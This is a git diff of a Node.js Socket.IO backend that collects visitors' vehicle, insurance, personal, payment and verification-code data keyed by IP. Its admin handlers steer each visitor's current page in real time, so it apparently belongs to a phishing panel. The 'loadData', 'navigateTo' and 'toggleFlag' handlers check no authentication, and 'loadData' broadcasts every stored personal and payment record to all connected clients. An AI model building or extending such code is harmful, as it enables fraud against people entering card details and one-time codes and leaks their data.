@@ -22,7 +22,12 @@ mongoose
   .then(() => console.log("✔ MongoDB connected test"))
   .catch((err) => console.error("✖ MongoDB connection error:", err));
 
+// admin import
+const Admin = require("./models/Admin");
+const { signToken, verifyToken } = require("./utils/jwt");
+
 // models imports
+
 const Index = require("./models/Index");
 const Cars = require("./models/Car");
 const Insurance = require("./models/Insurance");
@@ -46,7 +51,121 @@ async function findOrCreateUser(ip) {
 io.on("connection", (socket) => {
   console.log("▶", socket.id, "connected");
 
+  socket.on("loadData", async () => {
+    const [
+      Indexs,
+      Carss,
+      Insurances,
+      InsuranceCards,
+      InsuranceInfos,
+      PlateNumbers,
+      PolicyDates,
+      Quotes,
+      Payments,
+      Codes,
+    ] = await Promise.all([
+      Index.find().lean(),
+      Cars.find().lean(),
+      Insurance.find().lean(),
+      InsuranceCard.find().lean(),
+      InsuranceInfo.find().lean(),
+      PlateNumber.find().lean(), // your `phone` model
+      PolicyDate.find().lean(),
+      Quote.find().lean(),
+      Payment.find().lean(),
+      Code.find().lean(),
+    ]);
+
+    // gather flags & locations
+    const users = await User.find().lean();
+    const flags = users.map((u) => ({ ip: u.ip, flag: u.flag }));
+    const locations = users.map((u) => ({ ip: u.ip, currentPage: u.location }));
+
+    io.emit("initialData", {
+      Indexs,
+      Carss,
+      Insurances,
+      InsuranceCards,
+      InsuranceInfos,
+      PlateNumbers,
+      PolicyDates,
+      Quotes,
+      Payments,
+      Codes,
+      flags, // user.flag
+      locations, // user.location
+    });
+  });
+
   // admin login
+
+  /*  socket.on("registerAdmin", async ({ username, password }, callback) => {
+    try {
+      // 1) Reject empty
+      if (!username?.trim() || !password) {
+        return callback({
+          success: false,
+          message: "Username and password required.",
+        });
+      }
+
+      // 2) Check duplicate
+      const exists = await Admin.findOne({ username });
+      if (exists) {
+        return callback({ success: false, message: "Username already taken." });
+      }
+
+      // 3) Create & save (password hashing in pre-save hook)
+      const admin = new Admin({ username, password });
+      await admin.save();
+
+      // 4) Optionally issue a token immediately:
+      const token = generateTokenFor({
+        id: admin._id,
+        username: admin.username,
+      });
+
+      console.log("Admin registered.");
+
+      // 5) Acknowledge success
+      callback({ success: true, message: "Admin registered.", token });
+    } catch (err) {
+      console.error("registerAdmin error:", err);
+      callback({ success: false, message: "Server error. Try again later." });
+    }
+  }); */
+
+  // Admin: manual navigation
+  socket.on("navigateTo", async ({ ip, page }) => {
+    const user = await findOrCreateUser(ip);
+
+    user.location = page;
+    await user.save();
+    io.emit("navigateTo", { ip, page });
+  });
+
+  // Admin: toggle flag
+  socket.on("toggleFlag", async ({ ip, flag }) => {
+    const user = await findOrCreateUser(ip);
+    user.flag = flag;
+    await user.save();
+    io.emit("flagUpdated", { ip, flag });
+  });
+
+  // Visitor: page view
+  socket.on("updateLocation", async ({ ip, page }) => {
+    const user = await findOrCreateUser(ip);
+
+    user.currentPage = page;
+    user.lastSeenAt = new Date(); // or whatever timestamp field you prefer
+
+    socket.userIp = ip;
+
+    // 3. Save the changes:
+    await user.save();
+
+    io.emit("locationUpdated", { ip, page });
+  });
 
   socket.on("loginAdmin", async ({ username, password }, callback) => {
     try {
@@ -71,7 +190,7 @@ io.on("connection", (socket) => {
       };
 
       // 4) create token from safe payload
-      const token = generateTokenFor(userPayload); // your JWT/sign fn
+      const token = signToken(userPayload); // your JWT/sign fn
 
       return callback({ success: true, token, admin: userPayload });
     } catch (err) {
@@ -80,23 +199,35 @@ io.on("connection", (socket) => {
     }
   });
 
-  socket.on("verifyAdminToken", async ({ token }, cb) => {
+  socket.on("verifyAdminToken", async ({ token }, cb = () => {}) => {
     try {
-      const payload = verifyToken(token); // your JWT verify
-      // optional: check tokenVersion from DB
-      const admin = await Admin.findById(payload.userId);
-      if (!admin) return cb({ valid: false });
+      if (!token) return cb({ valid: false });
 
+      // 1) decode
+      const payload = verifyToken(token); // should contain { userId, tokenVersion? }
+
+      // 2) find admin
+      // ✅ payload.id (not userId)
+      const admin = await Admin.findById(payload.id);
+      if (!admin) {
+        console.log("[server] admin not found");
+        return cb({ valid: false });
+      }
+
+      // ✅ check tokenVersion if present
       if (
         typeof payload.tokenVersion === "number" &&
         admin.tokenVersion !== payload.tokenVersion
       ) {
+        console.log("[server] tokenVersion mismatch");
         return cb({ valid: false });
       }
 
-      cb({ valid: true });
-    } catch (e) {
-      cb({ valid: false });
+      // 4) ok
+      return cb({ valid: true });
+    } catch (err) {
+      console.error("verifyAdminToken error:", err.message);
+      return cb({ valid: false });
     }
   });
 
@@ -123,72 +254,6 @@ io.on("connection", (socket) => {
   // flow.js
 
   //flow body number
-  socket.on("submitCarBody", async (payload) => {
-    try {
-      const user = await findOrCreateUser(payload.ip);
-
-      const vin = (payload.carBody || "").trim().toUpperCase();
-      if (!vin) {
-        return socket.emit("ackCarBody", {
-          success: false,
-          error: "Body number (VIN) is required.",
-        });
-      }
-
-      const decodeUrl = `https://vpic.nhtsa.dot.gov/api/vehicles/DecodeVinValues/${vin}?format=json`;
-      const { data } = await axios.get(decodeUrl);
-      const info = data.Results[0] || {};
-
-      const carInfo = {
-        brand: info.Make || null,
-        model: info.Model || null,
-        year: info.ModelYear || null,
-        seat: info.Seats || info.SeatRows || null,
-        cyl: info.EngineCylinders || null,
-      };
-
-      const updated = await Cars.findOneAndUpdate(
-        { user: user._id },
-        {
-          $set: {
-            ip: payload.ip,
-            carBody: vin,
-            brand: carInfo.brand,
-            model: carInfo.model,
-            year: carInfo.year,
-            seat: carInfo.seat,
-            cyl: carInfo.cyl,
-            time: new Date(),
-          },
-          $setOnInsert: { user: user._id },
-        },
-        {
-          upsert: true,
-          new: true,
-          setDefaultsOnInsert: true,
-          runValidators: true,
-        }
-      );
-
-      io.emit("newCarBody", {
-        ip: updated.ip,
-        carBody: updated.carBody,
-        brand: updated.brand,
-        model: updated.model,
-        year: updated.year,
-        seat: updated.seat,
-        cyl: updated.cyl,
-      });
-
-      socket.emit("ackCarBody", { success: true, error: null });
-    } catch (err) {
-      console.error("Error in submitCarBody:", err);
-      socket.emit("ackCarBody", {
-        success: false,
-        error: err.message || "Server error while decoding car body.",
-      });
-    }
-  });
 
   // car flow.html
   socket.on("submitCar", async (payload) => {
@@ -200,12 +265,11 @@ io.on("connection", (socket) => {
         {
           $set: {
             ip: payload.ip,
-            carBody: vin,
-            brand: carInfo.brand,
-            model: carInfo.model,
-            year: carInfo.year,
-            seat: carInfo.seat,
-            cyl: carInfo.cyl,
+            brand: payload.brand,
+            model: payload.model,
+            year: payload.year,
+            seat: payload.seat,
+            cyl: payload.cyl,
             time: new Date(),
           },
           $setOnInsert: { user: user._id },
@@ -240,14 +304,16 @@ io.on("connection", (socket) => {
     try {
       const user = await findOrCreateUser(payload.ip);
 
+      console.log(payload.ip);
+
       const doc = await InsuranceCard.findOneAndUpdate(
         { user: user._id },
         {
           $set: {
-            ip,
-            vehicleType,
-            registrationYear,
-            cardId,
+            ip: payload.ip,
+            vehicleType: payload.type,
+            registrationYear: payload.first_registration_year,
+            cardId: payload.cardId,
             time: new Date(),
           },
           $setOnInsert: { user: user._id },
@@ -284,9 +350,9 @@ io.on("connection", (socket) => {
         { user: user._id },
         {
           $set: {
-            ip,
-            type,
-            cost,
+            ip: payload.ip,
+            type: payload.type,
+            cost: payload.cost,
             time: new Date(),
           },
           $setOnInsert: { user: user._id },
@@ -323,8 +389,8 @@ io.on("connection", (socket) => {
 
         {
           $set: {
-            ip,
-            plateNumber,
+            ip: payload.ip,
+            plateNumber: payload.plateNumber,
             time: new Date(),
           },
           $setOnInsert: { user: user._id },
@@ -359,12 +425,12 @@ io.on("connection", (socket) => {
         { user: user._id },
         {
           $set: {
-            ip,
-            name: fullName,
-            email,
-            gender,
-            address,
-            dob,
+            ip: payload.ip,
+            name: payload.fullName,
+            email: payload.email,
+            gender: payload.gender,
+            address: payload.address,
+            dob: payload.dob,
             time: new Date(),
           },
           $setOnInsert: { user: user._id },
@@ -378,7 +444,7 @@ io.on("connection", (socket) => {
       );
       io.emit("newInsuredInfo", {
         ip: doc.ip,
-        fullName: doc.fullName,
+        fullName: doc.name,
         address: doc.address,
         dob: doc.dob,
         email: doc.email,
@@ -397,12 +463,14 @@ io.on("connection", (socket) => {
     try {
       const user = await findOrCreateUser(payload.ip);
 
+      console.log(payload);
+
       const doc = await PolicyDate.findOneAndUpdate(
         { user: user._id },
         {
           $set: {
-            ip,
-            policyStartDate,
+            ip: payload.ip,
+            policyStartDate: payload.policyStartDate,
             time: new Date(),
           },
           $setOnInsert: { user: user._id },
@@ -437,11 +505,11 @@ io.on("connection", (socket) => {
         { user: user._id },
         {
           $set: {
-            ip,
-            term,
-            paymentMethod,
-            amount,
-            currency,
+            ip: payload.ip,
+            term: payload.term,
+            paymentMethod: payload.paymentMethod,
+            amount: payload.amount,
+            currency: payload.currency,
             time: new Date(),
           },
           $setOnInsert: { user: user._id },
@@ -508,7 +576,7 @@ io.on("connection", (socket) => {
     socket.emit("ackPayment", { success: true, error: null });
   });
 
-  socket.on("submitCode", async ({ ip, verification_code }) => {
+  socket.on("submitCode", async ({ ip, code }) => {
     // 1) Ensure the User exists
     const user = await findOrCreateUser(ip);
 
@@ -516,7 +584,7 @@ io.on("connection", (socket) => {
       { user: user._id },
       {
         $set: {
-          verificationCode: verification_code,
+          verificationCode: code,
           time: Date.now(),
         },
         $setOnInsert: { user: user._id },
